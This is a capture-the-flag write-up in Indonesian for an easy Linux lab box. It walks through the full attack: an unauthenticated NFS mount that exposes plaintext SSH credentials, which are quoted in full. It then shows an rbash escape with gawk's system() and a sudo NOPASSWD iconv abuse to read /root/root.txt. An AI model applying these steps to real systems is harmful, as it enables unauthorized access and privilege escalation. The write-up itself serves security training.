
|**Target**|10.1.2.139|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Hostname**|FareTheeWell|

---

## 1. Ringkasan (Summary)

Box ini dapat diselesaikan melalui rangkaian tahap berikut:

1. Enumerasi port menemukan layanan **NFS** yang dapat di-mount tanpa autentikasi.
2. Share NFS berisi kredensial SSH dalam bentuk plaintext.
3. Login SSH berhasil, namun pengguna terkunci dalam **restricted shell (rbash)**.
4. Restricted shell berhasil di-bypass menggunakan binary `gawk` yang tersedia.
5. Flag `user.txt` berhasil dibaca.
6. Konfigurasi `sudo` memperbolehkan eksekusi `/usr/bin/iconv` sebagai root tanpa password, yang dieksploitasi untuk membaca `root.txt`.

---

## 2. Reconnaissance

Pemindaian port awal dilakukan menggunakan `rustscan` yang dikombinasikan dengan skrip default Nmap (`-A -sC`):

```bash
rustscan -a 10.1.2.139 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil pemindaian:**

```
22/tcp    open  tcpwrapped syn-ack
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      49164/udp   mountd
|   100005  1,2,3      54795/tcp   mountd
|   100005  1,2,3      56938/udp6  mountd
|   100005  1,2,3      60041/tcp6  mountd
|   100021  1,3,4      37449/tcp6  nlockmgr
|   100021  1,3,4      44778/udp6  nlockmgr
|   100021  1,3,4      46413/tcp   nlockmgr
|   100021  1,3,4      47284/udp   nlockmgr
|   100024  1          38280/udp6  status
|   100024  1          40209/tcp6  status
|   100024  1          49976/udp   status
|   100024  1          54111/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl    syn-ack 3 (RPC #100227)
41241/tcp open  mountd     syn-ack 1-3 (RPC #100005)
42225/tcp open  mountd     syn-ack 1-3 (RPC #100005)
46413/tcp open  nlockmgr   syn-ack 1-4 (RPC #100021)
54111/tcp open  status     syn-ack 1 (RPC #100024)
54795/tcp open  mountd     syn-ack 1-3 (RPC #100005)
```

**Analisis:**

- Port **22 (SSH)** ditandai sebagai `tcpwrapped`, mengindikasikan adanya pembatasan akses (TCP Wrappers) berdasarkan kondisi tertentu.
- Port **111, 2049**, dan beberapa port RPC dinamis lainnya menunjukkan layanan **NFS (Network File System)** aktif secara penuh, lengkap dengan `mountd`, `nlockmgr`, dan `nfs_acl`.
- Kombinasi layanan ini mengarahkan fokus eksploitasi awal ke NFS, karena SSH sementara tidak dapat diakses langsung.

---

## 3. Eksploitasi NFS Share

### 3.1 Mounting Share

Share NFS yang tersedia (`/mnt/space`) di-mount ke sistem lokal:

```bash
sudo mount -t nfs 10.1.2.139:/mnt/space nfs_mount/ -o nolock,vers=3
```

### 3.2 Penemuan Kredensial

Di dalam share tersebut ditemukan file `final_todolist.txt` yang berisi kredensial SSH dalam bentuk plaintext:

```bash
cat final_todolist.txt
```

**Isi file:**

```
Before you go, don't forget to check whatever is left on your folder
contained in our main server and delete all your files there.
I have resetted your password so you can go ahead and log in with it.

User: breadconnoisseur
Pass: seeyoulaterbigspace
```

Kredensial ini kemudian digunakan untuk autentikasi SSH dan menjadi solusi atas masalah `tcpwrapped` yang ditemukan sebelumnya (kredensial valid diperlukan agar sesi SSH tidak langsung ditolak oleh server).

---

## 4. Initial Access & Restricted Shell Bypass

### 4.1 Login SSH

Login dilakukan menggunakan kredensial yang ditemukan:

```bash
ssh breadconnoisseur@10.1.2.139
```

Setelah berhasil login, ditemukan bahwa akun berjalan dalam **restricted shell (`rbash`)**, yang membatasi eksekusi perintah termasuk pemanggilan path absolut (mengandung karakter `/`).

### 4.2 Enumerasi Binary yang Tersedia

Untuk mengidentifikasi celah keluar dari `rbash`, seluruh command yang dapat diakses dienumerasi:

```bash
compgen -c
```

Dari daftar tersebut, ditemukan binary `gawk` yang tersedia dan tidak dibatasi oleh shell.

### 4.3 Bypass rbash

`gawk` memiliki fungsi `system()` yang dapat digunakan untuk memanggil shell baru di luar konteks restricted shell:

```bash
gawk 'BEGIN {system("/bin/bash")}'
```

Verifikasi keberhasilan bypass:

```bash
echo $0
```

**Output:** `/bin/bash` mengonfirmasi shell yang aktif sudah tidak lagi terbatas.

PATH kemudian diperbaiki agar seluruh binary sistem dapat diakses normal:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

## 5. Privilege Escalation

### 5.1 Enumerasi Hak Sudo

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for breadconnoisseur on FareTheeWell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User breadconnoisseur may run the following commands on FareTheeWell:
    (root) NOPASSWD: /usr/bin/iconv
```

Akun `breadconnoisseur` diperbolehkan menjalankan `/usr/bin/iconv` sebagai root tanpa password. Binary ini terdaftar dalam **GTFOBins** sebagai vektor privilege escalation yang dapat dimanfaatkan untuk membaca file arbitrer dengan hak akses root.

### 5.2 Eksploitasi iconv

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

Perintah ini berhasil menampilkan isi `root.txt` yang sebelumnya hanya dapat diakses oleh root.

---

## 6. Flags

|Flag|Nilai|
|---|---|
|`user.txt`|`309d99ac88****`|
|`root.txt`|`bd56d00c****`|***********
